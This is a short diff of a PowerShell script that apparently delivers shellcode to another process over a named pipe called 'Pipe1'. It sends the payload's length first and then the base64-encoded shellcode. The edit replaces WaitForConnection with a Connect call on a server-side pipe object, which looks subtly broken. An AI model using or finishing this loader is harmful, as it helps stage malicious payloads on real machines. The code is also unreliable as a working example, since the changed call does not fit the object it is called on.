@@ -59,13 +59,15 @@ $SHLEN4 = $PIT * 4 + $shellcode.Length
 
 $pipeName = "Pipe1"
 $pipe = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, [System.IO.Pipes.PipeDirection]::Out)
-$pipe.WaitForConnection()
+#$pipe.WaitForConnection()
+$pipe.Connect()
 $bytes = [System.Text.Encoding]::UTF8.GetBytes($SHLEN4)
 $pipe.Write($bytes, 0, $bytes.Length)
 $pipe.Close()
 
 $pipe = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, [System.IO.Pipes.PipeDirection]::Out)
-$pipe.WaitForConnection()
+#$pipe.WaitForConnection()
+$pipe.Connect()
 $enc = [System.Convert]::ToBase64String($shellcode)
 $bytes = [System.Text.Encoding]::UTF8.GetBytes($enc)
 $pipe.Write($bytes, 0, $bytes.Length)
